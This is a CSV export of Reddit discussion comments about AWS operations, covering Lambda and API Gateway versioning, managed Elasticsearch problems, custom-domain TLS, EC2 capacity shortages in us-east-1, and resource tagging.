g6j2k27,iz8nq2,We are using the serverless-framework but you need a plugin so I'm experimenting with Terraform. Right now we refer to the ApiGW ID in another stack and create other stacks for each version if you want to deploy multiple versions of the same API.,2.0
g6j8dtn,iz8nq2,AWS announced stack sets for cloud formation on the 17th. that might solve your problem,1.0
g6j0z76,iz8nq2,"We’ve started using AutoPublishAlias functionality.

https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/automating-updates-to-serverless-apps.html",1.0
g6j1auh,iz8nq2,"Is there a way to keep an alias pointing to it's original version, and create new aliases for subsequent versions?

I want my APIs to have Stages '/ver1' and '/ver2' and have each stage's Lambdas reference a different alias. I'm doing this with a stage var, unique to each stage.",1.0
g6j86vm,iz8nq2,can you shine some light on why you like this pattern? I prefer to use AWS organizations to create a separate account for my stages.,2.0
g6jb5ko,iz8nq2,"We effectively model this for dev/qa/prod/tools:

https://aws.amazon.com/blogs/devops/aws-building-a-secure-cross-account-continuous-delivery-pipeline/

It's a business requirement that we have different versions of our API always available, so different applications using one version of our API don't have the rug pulled out from under them when we do a major release that breaks our API contracts (e.g. going from /ver1 to /ver2).",3.0
g6jxvjs,iz8nq2,"So if you look at your lambda qualifier\\versions, does it look like...  


|Version|Alias|
|:-|:-|
|$LATEST||
|5|ver2|
|4||
|3|ver1|
|2||
|1||

&amp;#x200B;

Then your API Gateway has a stage /ver1 with a stage variable named ver1 that points to LambdaFunction:{StageVariable}

Do you ever deploy patches/fixes to ver1?  So ver2 would be LambdaFunction:5, and ver1 could now be LambdaFunction:6 ?

I guess the only times I've used APIs that I'm not consuming by my own sites, I've used a version attribute in the payload, so I can handle/override/sunset functionality in the code, and not rely on handling it through stages/variables/aliases.  Had issues trying to do something like that with managing environment variables, so like u/interactionjackson we started doing different versions (qa/uat/prod) in different accounts.",1.0
g6jyixa,iz8nq2,"Yup, that's exactly how ours look.
And yes, we do have patches for earlier versions as well.

The versioning piece is what makes this difficult to come up with a CICD process, without still requiring a pair of hands for SRE.",1.0
g6moxdt,iz8nq2,"If you are talking about using a single gateway for multiple environments (stages), consider using stage variables to make your integration points dynamic. You can also deploy the API GW config using swagger yaml very easily from a cicd pipeline

May have misunderstood what you are asking though",2.0
g6yu8ph,iz8nq2,"Thanks for the response!

I am thinking of using a single Pipeline that deploys in Dev, then Stg, then Prod. We do use a Stage Variable, which corresponds to an Alias we set on a Lambda Version. In our swagger, we reference the Stage Variable in the Lambda ARN (allowing us to use a published version of our Lambda).

However, this means we will need to create a new Lambda Version, Alias, and API Gateway Stage for every deployment. Sometimes, our developers will need to deploy to Dev dozens of times to test their work -- this means they would need to update the CloudFormation for every push they do in order to add the new AWS::Lambda::Version, update the Alias (or add a new one, depending on the situation), and create a new API Gateway Deployment.

I am thinking that Dev will use an API Gateway stage /latest which points to the $LATEST Lambda Version, so no one has to worry about the Lambda Versions in CloudFormation until they're ready to go to Staging. Once they're tested in Dev, they can add the CloudFormation changes for Versions, Aliases, and API GW, and do another deployment. This deploys to Dev, then Stg, then Prod. I can't think of a better process, yet this still feels immature.",2.0
g707n49,iz8nq2,"Curious as to why you want a single pipeline to do all of your deployments. And why you have chosen a single lambda. From purely a security and ops perspective, I would prefer separate pipelines for each environment and separate deployments i.e. lambdas for each. Think of it from a traditional deployment model, you wouldn’t want dev, stage, and prod code running on shared hardware and you would want to control each independently.",2.0
g708hod,iz8nq2,"Ah, Dev, Stg, and Prod are all in different accounts -- we replicate the infrastructure in each environment.

However, each account has an API GW with different Stages, like /ver1 and /ver2. Each Stage has its resources pointing to a different version of the same Lambdas, just depending on the version number (this is done using stage variables &amp; aliases). 

The same Lambdas exists in Dev, Stg, and Prod.
So the Pipeline would update that Lambda in Dev, then in Stg, then in Prod.

We provide an API to some other teams, and we create a new Stage (like /ver3) whenever an update to our API would cause our API responses to differ from the last version's contract.",2.0
_,iz8nq2,,
g6l5f4g,iz8nq2,"We use Teraform for the IAC. One pipeline builds Lambda functions and uploads the zip files to an S3 bucket. The second pipeline runs the Teraform which picks up the new versions of the Lambdas, updates the function, version, and alias, and redeploys the API Gateway. It's not the most elegant solution but it gets the job done. Biggest challenge we've run into is that updating the environment variables doesn't update the version of the Lambda, so the latest version and the alias can get out of sync is we don't build the Lambda that's changing.",1.0
g6h849e,iz6qv9,"Yes, standard Lambda pricing.

Built-in authorizers have no extra charge.",2.0
g6jjdg2,iz6qv9,"&gt;Yes, standard Lambda pricing.

Thanks. Even if the authorization doesn't pass?

&amp;#x200B;

&gt;Built-in authorizers have no extra charge.

That's good :D",1.0
g6jmnz9,iz6qv9,If the Lambda executes you pay for it.,2.0
g6ixvas,iz6895,"The encryption of the ephemeral volume in Fargate PV 1.4 is completely independent of the cluster where the task is running. There's also nothing you need to (or can) do to enable or disable the volume encryption. With PV 1.4, the ephemeral volume is *always* encrypted using a service-managed key.

If you want to control _which_ key is used to encrypt the ephemeral volume, you should keep an eye on this issue on our public roadmap:

https://github.com/aws/containers-roadmap/issues/915",1.0
g6hcdf1,iz5z0s,Just a word of warning here.  If you're planning on making this a legally defensible signature there is a lot more involved than signing the document with a cert.  Amongst other things you'll need to be able to prove via audit trail that the document and signature have not been modified since it was signed.  We looked at building our own solution at work.  It's an incredible amount of work which is why companies like DocuSign and eSignLive exist.  I'd be very careful and ensure that you're compliant with all the various legislation in the regions you're planning on making your service available.,2.0
g6gqrp2,iz51lk,"Your doomed .

There is a perfectly fine mechanism bullt into the SDK to fetch credentials from environment, or compute role (if running in AWS cloud). Make people use it!",18.0
g6gq2t7,iz51lk,While this isn't specific to Ruby another issue i see libraries doing (in Java) is not realizing that credentials can be rotated and you often time want to provide a credential provider to handle that instead of manually passing the id+key.,4.0
g6i5ajj,iz51lk,The only thing you're doing wrong is setting your expectations too high.,2.0
g6gsaxl,iz51lk,"Hmm I have done this with the golang sdk. There you create a session setting a region and it does the look up for you following the same order the aws cli does. So it then “just works” in k8s pods, EC2, lambda or evening locally with zero code changes.",1.0
g6gyb4t,iz48gt,Be careful using this service.  Many AWS services are great but this one has been a colossal nightmare for me.,39.0
g6hb71q,iz48gt,Ditto. We actually migrated away from it into self-hosted.,6.0
g6gyfoa,iz48gt,Please do share your experiences. What went wrong? Why?,13.0
g6i79e6,iz48gt,"We've had a number of cases where the cluster just plain stops handling requests, and we get back 500s for everything. We contact AWS support, and we get a reply ""we have fixed it"". 

What did they do? 

Why can't we have a button in the console to do that? Raising a support ticket every time costs us 24 hours before a response...

How do we avoid this happening in future?

*Nobody knows...*",9.0
g6j2vh3,iz48gt,Same issue happened with us,4.0
g6jki7o,iz48gt,"Did you ever fix this?

We're using 3 master nodes and 6 worker nodes with m5.large instances. The average CPU utilisation under *heavy* load is 5% and yet we often get 500s ""No server available"" returned. 

It's a giant waste of money for us right now but not much we can do right now.",1.0
g6l5pwi,iz48gt,Nope. We just contact support and they fix it every time.,1.0
g6h0cbh,iz48gt,"I've had many issues over the years but the latest was in the Spring when instances were not clearing their heap resulting in a 4 day around the clock effort to migrate off of managed elasticsearch without downtime.  No sleep for 4 days is not something I ever want to repeat.

ES isn't really designed to be a managed service.  You have to be able to see/modify its configuration and that's something managed ES simply does not allow.",15.0
g6h82ay,iz48gt,"Elasticsearch needs managing.  

I haven't used Elasticsearch at all in the past couple of years, but used it heavily in both the AWS service and direct on EC2 forms for a number of years before that.  The AWS service makes some things easier, but you still need quite a deep knowledge of how Elasticsearch works under the hood \*and\* how the AWS service carries out operations (how indexes get allocated, whether a particular action will cause new cluster node creation and deletion of the old and a myriad of other gotchas).

In theory, the Elasticsearch service is very much like RDS.  In practice, you can be very hands off with RDS because in most cases you have a simple active/passive model with effectively only a single server.  Distributed systems are harder to maintain, and the AWS service can't manage all of those details for you.",10.0
g6hryxa,iz48gt,"I've never understood the appeal of the managed Elasticsearch service. It's normal EC2 pricing marked up 25% so you get a nice dashboard and a few buttons for moving things around and snapshotting, when in reality you could use the free API for and Ansible/Chef/Puppet to do yourself if you know Elasticsearch. And you absolutely need to know Elasticsearch to get value out of it. Unless you are just throwing reasonable amounts of unstructured data in it to use for plain-old index/search, it requires handholding. If you get to know it, though, it's absolutely awesome and the free version now has so many features, and it's so stable, there's little reason to get the licensed versions unless you need the fancy ML stuff.",-1.0
g6htw83,iz48gt,The ability to add/remove instances and roll the cluster over without downtime to a completely new one with a few mouse clicks is really awesome.  That was a huge plus when I worked with a client that was scaling quickly.,10.0
g6ivs8q,iz48gt,"Yes, that's awesome, but it's completely replicable yourself if you have the virtualization infrastructure and centralized config management. You could easily do it yourself with plain EC2 instances, for example, if you don't have the resources on-prem.",0.0
g6jpzkr,iz48gt,True and that's how I roll now but for someone looking at doing minimal work to get an ES cluster out and grow it over time then it's hard to beat that simplicity.,1.0
g6iky8c,iz48gt,Except permissions. Thats the feature missing from free that we really can't live without.,1.0
g6ivor3,iz48gt,"Free has permissions, including index-level access control. If you need field-level access control true, you are out of luck, but I've never had a need for it.",1.0
g6pqx1s,iz48gt,IIRC that's in the OpenDistro ES fork that AWS maintains - could you deploy that to your own instances?,1.0
g6ho01p,iz48gt,I'm curious about this. Heap not clearing up as expected sounds like an under-scaled cluster. Had you setup cloudwatch alarms for jvmmp before this incident? Was AWS support able to help you with this?,1.0
g6htj2j,iz48gt,"This was 100% an AWS misconfiguration.  Very likely in the JVM configuration. I was able to repro the issue with a bad JVM config.  What we had was a stepwise heap clearance problem where on every GC collect less heap was freed.  We rolled into a 4x larger cluster that still had the problem.  We then split our indexes across numerous individual elasticsearch instances that ALL exhibited the problem regardless of load (One of them was almost idle for days as the heap disappeared).

We eventually rewrote our backend systems to forward traffic to both our own cluster and a larger Managed ES cluster.  The AWS Managed ES cluster failed after 4 hours...  our cluster... ...is still up.  Also it costs a whole lot less and performs a lot better :)

Imagine having to debug this without access to the configuration?  4 days of my life gone forever... be very careful with AWS Managed Elasticsearch.",3.0
g6inbrw,iz48gt,"My team ran into this exact same problem recently. It took a while to convince AWS support that this was clearly some sort of memory leak, as it was happening with a fraction of the traffic/data we had historically served with little memory usage and the same code. By that point, a node was failing all requests, and I couldn't modify the cluster to force a deployment that would replace the nodes. Ironically, the memory circuit breaker prevented the OOM exception that would have presumably caused it to be rebooted/replaced quickly. Really frustrating. It's still a latent problem for us until we can switch away.",2.0
g6ihhpo,iz48gt,"Damn, so what did aws support say about this problem then?",3.0
g6jgzo3,iz48gt,"I didn’t just have aws support involved... I had the actual aws elasticsearch engineering team involved.

We had moved off of managed ES before they figured it out.  I assume it was eventually fixed as several companies were complaining at the time about the same problem.  However, I don’t actually know as I run my own ES clusters now.",2.0
g6jzwqw,iz48gt,"I’m curious what bad JVM config you could reproduce it with? This sounds more like an application level issue, so possibly something within Elasticsearch like an unbounded (or too high of bounds) cache. The GC clearing less each time is usually because there’s long lived objects hanging around so it will look like a memory leak. I will say without being able to take a heap dump this would be frustrating to diagnose although some of the Elasticsearch endpoints may give you some clues as they report on memory usage across the various caches/metadata stored in ES. Just wonder if there’s something going on like field mapping/index explosion or something that the AWS configured ES settings are not handling well. 

I can’t say I’ve run into this problem using AWS ES and have generally been happy with it although have heard these similar comments. The cluster I’m running is also at a small scale so that could be part of it.",1.0
g6k1ocq,iz48gt,"It was a jetty setting although I don't remember which one today.  I can't prove that was the problem since I had no access to their configuration but I had similar behaviour with it set.

Yes, not being able to take a heap dump also sucked at the time.

So many things about this experience sucked that I never want to reproduce it :). On the plus side, I was able to migrate off without downtime although I did need to wake up and roll the cluster every few hours for 4 days while I figured out wtf was going on and how to deal with it.",1.0
g6hv908,iz48gt,"How long ago did you use it? At launch it was awful, but we started using it this year and it’s been great. You still need to be aware of how you manage your indexes and replication, but I’m pretty happy with how the service has worked out.",4.0
g6hlbpi,iz48gt,It so unbelievably expensive for what it does,2.0
g6gx95b,iz48gt,"Ooh, super-ready to save some cost with these.

AWS said that t2 instances were not recommended for production use. Is this any different for t3? They also recommend c5 for dedicated master nodes and r5 for data nodes – would a t3 be better for one of these than the other?",2.0
g6h0e79,iz48gt,"Looks like `t3.medium` is [OK](https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/aes-limits.html) as a dedicated master instance:

&gt;We don't recommend T2 or `t3.small` instance types for production domains.",4.0
g6gy9z5,iz48gt,"t3 is just the latest revision of the family, so same caveats would apply",3.0
g6ipjss,iz48gt,Looks like the t2 and t3 instances have the same price :/,1.0
g6h70x7,iz48gt,"Does t-series still does not support encryption, correct?",3.0
g6h8lnb,iz48gt,"From the post:

&gt; The T3 instances also support our recently launched features like encryption at rest and in-flight, role based access control, HTTP compression, custom dictionary, SQL, alerting, anomaly detection, and cross-cluster search.",12.0
g6h9f7m,iz48gt,"Ooh!! Thanks, I should have RTFM :)",4.0
g6z0fsy,iz48gt,"So we scaled up from t2.mediums in our DEV envs to m5.larges to support encryption, but now that t3.mediums can handle encryption as well, I want to scale us back down.

Here's a simple question I can't seem to find the answer to: if I modify the existing AWS ES clusters and change their Instance Type from m5.medium to t3.medium, will it size-down in place? Or is my data getting wiped out with the instance and we're getting a brand new blank t3.medium?",1.0
g6z3qdz,iz48gt,It'll happen in-place without data wipe. We moved from t2 to t3 and it took about 5-10 minutes to switch over. But please make sure you do have backups or can easily reindex from your primary source in case something goes wrong and don't trust random people like myself.,2.0
g6gkcon,iz2v2y,"CloudFront only supports a single certificate, so to support a unique certificate per customer, you'll have to create a new CloudFront distribution per customer, although they can all share the same origin.  Fortunately, the costs stay the same and the time to create CloudFront distributions is way faster than it used to be up to a few months ago.

In theory, you could create certificates with multiple domains on them but that's probably not an approach your customers would like, and there's also a limit on that (default 10).

The last option is to roll your own reverse proxy with NGINX and provide certs with Let's Encrypt.  The benefit here is that you set it up once and forget about it, but the infrastructure costs will be much greater than setting up multiple CF distributions, and you won't get the benefit of the PoPs - you'd have to run it in different regions and use Route53 GeoIP.

How many custom domains do you need? Dozens? Hundreds? Thousands?  The default limit for CF distributions per account is 200, which can be raised.",1.0
g6h1s6f,iz2v2y,Thousands+,1.0
g6gki2y,iz2v2y,"The alternative is that you manage all the certificates yourself on your own server instances (rather than have AWS do TLS termination for you) and then you don't have to worry about AWS certificate limits/quotas.

What does this look like in practice? Basically you'd setup a Network Load Balancer (without TLS termination enabled) and then you'd have server instances sitting behind the NLB. Those server instances would then manage all the certificates for your users' web spaces and handle the TLS termination.

You may want to take a look at Caddy—it's a simple web server (written in Go) that can automagically take care of certificate provisioning and renewal for you using an ACME-compatible Certificate Authority (like Let's Encrypt) for all the domains that you add to your Caddy config (and you can dynamically add more domains via the Caddy API without having to interrupt or restart the server). Then you can either have Caddy respond directly to requests for users' web space resources or you can proxy those requests to another server (or S3).

Be aware though that this approach is not compatible with any AWS services where AWS handles the TLS termination for you (e.g. CloudFront, API Gateway, Application Load Balancer etc.) So you would have to give those services up in exchange for more freedom and control when it comes to managing certificates for your users' web spaces. Also be aware that this approach requires some level of technical skill/expertise.. even though Caddy makes it relatively simple, you still need to have at least some background knowledge in server management and TLS termination to be able to pull this sort of thing off, especially if you want a highly available system where you have multiple Caddy instances in a cluster that need to share the same certificates and configuration.",1.0
g6h2y1z,iz2v2y,"&gt;eed to share the

Thanks, this is very interesting! We were thinking about nginx, what are the advantages of caddy over nginx ? I would really like to find  a way to do this directly through AWS as it is mostly a serverless infrastructure... but bare servers is our last recourse",1.0
g6hf97i,iz2v2y,"I don't know enough about Nginx to really comment on what the solution may look like using Nginx instead of Caddy.

With respect to [Caddy](https://caddyserver.com/), what I can say is that it's designed to be very simple to manage and configure and it also has built-in automatic certificate provisioning and renewal turned on by default with no added configuration necessary, so it can be a good fit for these types of situations where you want simple automatic certificate management for a large number of domains.

Caddy also supports dynamic cert loading which, if turned on, means that Caddy can obtain certificates on-demand as needed during the initial TLS handshake (like the first time each user's web space is accessed) as opposed to having to obtain certificates for all domains in advance. It's also possible to setup a shared storage system where all your Caddy instances can share the same certificates which, among other things, helps to avoid hitting rate limits on Let's Encrypt (or whatever Certificate Authority you use).

I'm sure Nginx is capable of doing the same sort of thing, but I imagine it would require a lot of manual setup/configuration and wouldn't just work out-of-the-box so to speak.

Edit: It's also worth noting that Caddy is designed to run in a container, so you can run it on Amazon ECS for example without having to worry about managing servers.",1.0
g6hjtmj,iz2v2y,"Fathom Analytics uses Caddy for basically the exact same thing. It's the only server that's suitable for custom domains over HTTPS: https://usefathom.com/blog/custom-domains-embed-code - you can read the nitty gritty of their specific setup here: https://laravel-news.com/unlimited-custom-domains-vapor (though it will be quite different from your own).

There's a bunch of reasons why, including that we've been doing this before anyone else, but ask me your questions and it should begin to become clear.

For stuff like this, you _want_ to control the servers. ""Serverless"" is just a bad name for ""servers you don't have any control over.""

I guarantee Caddy will scale globally with your infrastructure up to tens of thousands of certificates, no problem. Several other companies (that I know of, probably there are more) are doing it already.

(Disclaimer: Caddy author)",1.0
g6j2a56,iz2v2y,"

Thanks for your help!",1.0
g6ghfgr,iz2mmf,"I’ve been seeing this a lot with our customers who use spot instances in this region. The spot termination rate has increased dramatically. With the elections, holiday season, etc there is more demand than usual.",20.0
g6gb013,iz2mmf,"If not reserved instances your best bet is to spread across as many AZs as possible, and use Launch Templates that accept as many different instance types as possible. You mention m5.xl, consider m5n / m5d.xl and so on.",13.0
g6gr2ka,iz2mmf,It's what we do on launch template but really it's a shame. Never had this kind of issue on eu-west-1. But I know us-east-1 is the oldest and propably the most use aws region. We should move to another us region but the migration cost is prohibitive.,3.0
g6h8so1,iz2mmf,dont you dare come fill up us-east-2.   DONT YOU DARE......,9.0
g6izgcd,iz2mmf,I've already seen an uptick in spot instance termination rates in us-east-2.,1.0
g6j28zv,iz2mmf,https://i.imgur.com/jjdqSsb.mp4,1.0
g6gvodo,iz2mmf,[deleted],7.0
g6h9qqb,iz2mmf,found the amazonian :),9.0
g6i3qxr,iz2mmf,"Not for long, leaking non-public info if true. ;)",-4.0
g6il014,iz2mmf,And all the outages first!,1.0
g6gf0ho,iz2mmf,"You could also include the new m6g series, they are in parity to m5 (I believe). Likely less used at the moment as well.",2.0
g6gkkux,iz2mmf,You can’t mix and match arm and x86 in the same launch template.,7.0
g6gh05z,iz2mmf,Graviton is arm based  sooooo please test prior,5.0
g6gfr05,iz2mmf,"M6 has a different processor architecture. Graviton processors are better, but be prepared to retest your app",4.0
g6i3t9l,iz2mmf,Define 'better' :),3.0
g6gxlu4,iz2mmf,"I've heard several former AWS employees say, ""friends don't let friends use us-east-1.""",21.0
g6h8v7h,iz2mmf,us-east-2 is where its at.    the party in the shed at the big party house if you will.,12.0
g6h11yb,iz2mmf,Why is that?,1.0
g6h8c9z,iz2mmf,"Two reasons:

1. It is the oldest region, and while they have added several new ""zones,"" the 1a, 1b, 1c, etc. are running on some ancient infrastructure. Over the years, equipment does wear down, gets dated, old, breaks, etc. Basically, everything is old. 
2. It is the ""guinea-pig"" where everything gets tested before it is safe to release to other regions.",8.0
g6i3x6n,iz2mmf,"So much of this makes no sense to me.

If it's so big and fragile, why use it as a guinea pig? Wouldn't it be safer to roll out to smaller regions first, lower blast radius?",1.0
g6ibat8,iz2mmf,"It also has the most established company infrastructure. Who's coming up with the innovative new hardware and designs, the team in Northern Virginia, or the smaller new region?",1.0
g6hx4fu,iz2mmf,"We are in us-east-1. For the past several weeks, we have been encountering occasional EC2 launch errors due to insufficient capacity. We have seen it with m5.2xlarge, m5.4xlarge, and m5ad.xlarge.

Per Enterprise Support, we created capacity reservations, which reduced the issue.  However, we still encounter it occasionally, even for capacity we have reserved. Where possible we have tried to be flexible on instance type and AZ, but that is not always possible. 

Amazon needs to get more servers racked.",4.0
g6iz38d,iz2mmf,"Same here, have been getting random bouts of both insufficient capacity (mostly for spot c5 and m5 types) as well as a lot more spot terminations across all of our us-east-1 AZs.   Usually lasts for a few hours and then eases back up.",1.0
g6gojmt,iz2mmf,"My AWS rep used to reference this as getting ICE'd (insufficient capacity error). Are you specifying an AZ, like us-east-1a, or is this for an autoscaling group across multiple AZ's?  Maybe try a different AZ and see if that helps?",3.0
g6grgip,iz2mmf,For asg in multi az. But also need a lot of patience for just changing or launching new instance of some type. We may be forced to have a lot of unused instance spared to pass the black friday. It's the Cloud elasticity promess.,1.0
g6gjz2k,iz2mmf,"It doesn't sound like it's the case but just to cover every base, are you hitting your service quota?",2.0
g6gpybg,iz2mmf,No no our quota is way higher.,2.0
g6glmec,iz2mmf,"Just in case you weren't aware, AWS actually does have consistent IDs for availability zones that point to the same location across accounts. 

https://docs.aws.amazon.com/ram/latest/userguide/working-with-az-ids.html

Also, is the problem now resolved? I'm curious as to how long this issue lasted for.",2.0
g6glgs1,iz2mmf,Is what you're seeing tied to any particular real AZ id?,1.0
g6gqhgu,iz2mmf,No cause it happens in the 3 az we had. I don't make stats so maybe a physical az is more impacted ?,1.0
g6gv2bs,iz2mmf,"I can confirm this too, and thought I was alone in this! In my case, I tried to spin up an EKS cluster and it constantly failed in some specific AZs on my account. Had to manually exclude the problematic AZ",1.0
g6gvmz7,iz2mmf,We had that issue last night (evening Sep 23rd GMT). We couldn’t spin up c5 instances in one of our AZ’s for a few hours.,1.0
g6k2dpq,iz2mmf,"I use t3a.smalls almost exclusively, and I've never had an issue, despite multiple ASGs scaling up and down constantly.

I'm not sure if this is true, but maybe it's much easier to find space for a smaller instance in the hardware than it is to find space for a larger one.",1.0
g6k4sug,iz2mmf,Yes definitively easiest to find small instances. It's like in memory or any system that is partionnable. Think at your car boot. You can always find place for something small but not for a big bagage.,2.0
g6gaxoi,iz2mmf,We have not ran into that issue.,0.0
g6gm2d1,iz2mmf,[deleted],-8.0
g6gn2nd,iz2mmf,US-East-1 is N. Virginia.,17.0
g6gq4xa,iz2mmf,"We tried basing everything out of us-west-1 and we got complaints constantly.  So, we setup at us-east-1 and we got complaints.  Finally, we setup multi-region and everyone was happy.",2.0
g6gmhjq,iz2mmf,N. California :),1.0
g6gmud4,iz2mmf,"I've found that generally US-West-1 is more expensive than other regions. Also, the West Coast is on fire.",8.0
g6gnlug,iz2mmf,us-west-1 datacenter's (probably) don't exist in the tree line.,2.0
g6hutzz,iz2bqz,MSK is just Kafka. You would just use the module/driver of your choice for the language of your choice and publish messages to Kafka directly.,1.0
g6ht8do,iz24t7,"Solved. 

&amp;#x200B;

    `cat /opt/elasticbeanstalk/deployment/env | sed ""s/=/&amp;'/;s/$/'/""  | tr '\n' ','`",1.0
g6g825k,iz1jno,existing? AWS Support will do,1.0
g6g3d8v,iz0yxv,Slack just put up a blog post of how they're using it: [https://slack.engineering/building-the-next-evolution-of-cloud-networks-at-slack/](https://slack.engineering/building-the-next-evolution-of-cloud-networks-at-slack/),4.0
g6gh1he,iz0yxv,Awesome!  Thank you!!,1.0
g6hptdx,iz0yxv,"Multi(40+) account structure, using vpc sharing to control vpcs in a centeral point.",2.0
g6hqmym,iz0yxv,"Are you getting any cool functionality out of it?  We’ve got &gt;500 accounts and just allocating address space to all of those VPCs in multiple regions becomes a mess.

I’m assuming instances with appropriate security group can talk to each other across accounts? 

Thanks!!",2.0
g6hr318,iz0yxv,"Yeah, because they are all in the same VPC. So you setup your vpcs to miror traditional dev staging prod and any other environments you need, and then just share those vpcs to an AWS Organizational Unit, add each account to the OU specific to its environment etc. That way you're not sharing to each indivial account, and when new accounts are made, add them to the appropriate OU, and the share happens immediately. 
Biggest downside so far, tags do not follow the resources when you share, so you have to tag em yourself or find another method for adding the tags in the new account (the name is the biggest one obviously)",2.0
g6hs1sw,iz0yxv,"Oh wow, that sounds great!  Thank you!  I really appreciate all of the detail btw!",2.0
g6gm9j4,iz0yxv,"I use it with the geo-replication of Quay (container registry). I run Quay instances in two regions (US and EU) and wanted to keep the database and redis instances off the public internet. Geo-replicated Quay uses regional S3 but requires a shared database and redis cluster reachable from all instances in my two regions. In my case this is an RDS-provided Postgres with a VPC-internal IP and AWS ElastiCache cluster behind a private load balancer. To have the two Quay deployments access them both, I used VPC peering since VPCs don’t span regions (unlike in GCP). Works.",1.0
g6mt9vm,iz0yxv,"I’ve been on a couple of projects that used this approach with success

https://medium.com/slalom-technology/next-generation-networking-with-aws-transit-gateway-and-shared-vpcs-9d971d868c65",1.0
g6fuzkm,iz01gr,Check CPU credits on the T2s in RDS? Sorry on mobile,2.0
g6g7bk0,iyzlop,CostCenter and Application useful in cost explorer,3.0
g6fpcaf,iyzlop,"Depends on the type of resource your're deploying, but some other ones that I'll add are: Date Launched, Scheduled (Turn Off / On), Backup Tier, Automated (e.g. Terraform, Cloudformation)",2.0
g6g73x6,iyzlop,Would also like to add release version as tags. For my team we have an infra version used for infrastructure releases,4.0
g6fqe7a,iyzlop,Good ideas.  Thanks!,2.0
g6fqblf,iyzlop,"If the configuration of the resource is driven by a vcs repo of some kind, a link back to that repo.",2.0
g6gd6kz,iyzlop,"Name

Platform (team)

Application

Environment

[Terraform: Yes]

[Canary: Yes]",2.0
g6gl3to,iyzlop,"Name

Environment

Project

Owning Team

Owner/Administrator

Cost Center (sometimes different than the above)

AutoBackupBool = yes / no

CfnStackId",2.0
g6ha5iv,iyzlop,"Good suggestions so far. The only one I’d add is “requester”. Having a team / administrator who manages it is great, but 5 years from now, a server might get lost in the shuffle and no one has any idea what it does anymore. Having a requestor will at least give another name to track down what it was initially used for.",2.0
g6hev9t,iyzlop,I used to use REQUESTOR (technical contact) and APPOWNER (business contact).,1.0
g6g75xd,iyykqi,"What’s your C++ code running on?

I’m pretty sure this is currently not achievable due to a known lack of support. 

https://github.com/aws/aws-xray-sdk-node/issues/208",2.0
g6g8ec5,iyykqi,"Thanks for your reply. During my research I had glanced over that github issue but apparently overlooked the fatality of it. 

Seems like I have to live with it then. The C++ code is running on both autoscaled Ec2 instances as well as on premise workers. I did most of the trials outside the cloud though because, well, convenience. I already hoped the local xray daemon output would help but it doesn’t. What did catch my eye though is the actual json document that daemon assembles. At least I think that’s what I can examine when I look at the raw view of the trace. That appears to be weird in some way. The parent ids that it’s transmitting don’t make much sense to me. Hence the hunch.",1.0
g6g9sof,iyxgjo,"It seems that the IAM role itself is not set. Value of S3IngestionRoleArn should be an ARN that points to the role.
Never used RDS, but I think this article covers all the required permissions:  https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/MySQL.Procedural.Importing.html
  (Check *Creating an IAM Role Manually*)",1.0
g6f3slz,iywh6s,"You'll want to look at the AWS Managed rules for the OWASP Top 10 stuff: https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-list.html

For DDoS take a look at rate limiting: https://docs.aws.amazon.com/waf/latest/developerguide/waf-rule-statement-type-rate-based.html",6.0
g6f3u4n,iywh6s,Awesome thanks!,1.0
g6gbqnu,iywh6s,Also there is a nice AWS Solution for automated WAF rules: https://aws.amazon.com/solutions/implementations/aws-waf-security-automations/,3.0
g6gbv5b,iywh6s,Thanks! Will look in to it,1.0
g6fpwf3,iyw81b,"No such thing as a stupid question  :). Configuring access depends on how your authorizing people into the AWS Console / CLI (e.g., Federation via SAML/Oauth or just plain old IAM). The key component is by configuring IAM policies. I've attached a doc for your reference on getting started with them: 

https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/AWSHowTo.iam.html

https://docs.aws.amazon.com/IAM/latest/UserGuide/introduction.html",1.0
g6wbccx,iyw81b,Thank you for the info!,1.0
g6f5bmq,iyuxc5,"I investigated what it would take to connect to Oracle via Lambda about a year ago.  What a headache....we're almost fully off of Oracle and onto Aurora/MySQL now, so I don't have to fight this battle in order to use FAAS like a normal developer :)

Here's an article where they used Oracle Instant Client, not sure what you're using: [https://www.rehanvdm.com/serverless/an-unexpected-journey-with-lambda-oracledb/index.html](https://www.rehanvdm.com/serverless/an-unexpected-journey-with-lambda-oracledb/index.html)",3.0
g6kpas2,iyuxc5,"There is another interface called ORDS which is essentially used for JSON on REST

[Installation of ORDS (Oracle REST Data Services) 19.x on AWS RDS](https://matthiashoys.wordpress.com/2019/09/10/installation-of-ords-oracle-rest-data-services-19-x-on-aws-rds/)

Example of python using ORDS:

[https://github.com/oracle/oracle-functions-samples/tree/master/samples/oci-adb-ords-runsql-python](https://github.com/oracle/oracle-functions-samples/tree/master/samples/oci-adb-ords-runsql-python)",1.0
g6gs1o3,iyux0b,"Do you mount the EFS on the host and use it then or dou you use an ECS EFS driver?

If the first, check the user you're running your container with, but also the owner/group of the directory you want to mount in your Dockerfile. As those owner/group permissions are the initial permissions for the volume.",1.0
g6htlf8,iyux0b,i didn't do any manual mounting since the task is expected to jump around instances since it is a spot instance cluster. So probably the ECS EFS driver i think,1.0
g6i7z2z,iyux0b,"Hmm, still check the things maybe",1.0
g6iisu9,iyu9zb,"The task host port is only random in awsvpc networking when you don't set the host port to your container port. You're going to have trouble targeting a random at runtime port (except ranges) with a security group whether you're on ECS or a random EC2, CDK or not. It's probably for the better to explicitly set the host port option on your task so you get a consistent listening port on the task ENI.",1.0
g6inp5s,iyu9zb,"Thank for your answer!
Isn't this going to be an issue when multiple instance of the application exist on the same host?
Also, you have any idea about how to solve my first issue regarding referencing cross-peer-connected-VPC security groups?",1.0
g6etbmy,iyuhzd,"You could remove the drifter resources from you CF template, be sure to set a deletion policy, and then import the drifted resources into the template",1.0
g6grhru,iyuhzd,"If your drift is for example a crrtificate arn for a loadbalancer, introduce a parameter in the template for that arn, and make future changes to resources using the cert, via the cf stack.",1.0
g6f9bql,iyqfuu,Are you going to work or to fight for justice?,1.0
g6gux8r,iyqfuu,"Says a lot about the culture, types of leaders and management they attract and it all filters down. I want to work somewhere that gives back and isn’t just a money making machine.",1.0
g6h94zu,iyqfuu,"What profitable unsubsidised business with more than 1,000 employees meets your ethical standards?",1.0
